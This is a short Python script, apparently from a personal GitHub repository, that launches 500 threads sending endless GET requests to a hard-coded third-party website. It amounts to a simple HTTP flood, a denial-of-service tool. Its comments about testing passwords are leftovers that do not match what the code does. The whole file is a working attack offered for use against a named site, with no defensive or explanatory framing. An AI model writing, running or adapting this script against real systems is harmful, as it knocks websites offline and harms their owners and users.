#!/usr/bin/python3

# author Diego Rodríguez Riera
# from https://github.com/riera90/scripts
# licenced under BSD 3-Clause License
# date 18/02/19

# Intended to use on websites, what else would you use this for...


import requests
import re
import json
import threading
import time
import os


################################################################################
############################### Configuration ##################################
################################################################################
number_of_threads = 500
# target login
target = "http://www.seleccioncadete18.com"
# target username and password input
################################################################################
########################### end of Configuration ###############################
################################################################################

# this function tests a series of passwords
def make_request():
	# creates the session (mainly to store cookies1)
	bot = requests.session()
	thread_name = threading.currentThread().getName()

	# here we go
	while True:
		# makes the GET
		bot.get(url = target)


# creates the threads
print("initializing threads.")
threads = []
for i in range(number_of_threads):
	t = threading.Thread(target=make_request, name='thread '+str(i))
	threads.append(t)
# launches the threads
for thread in threads:
	thread.start()

time.sleep(2)

# joins the threads
for thread in threads:
	thread.join()
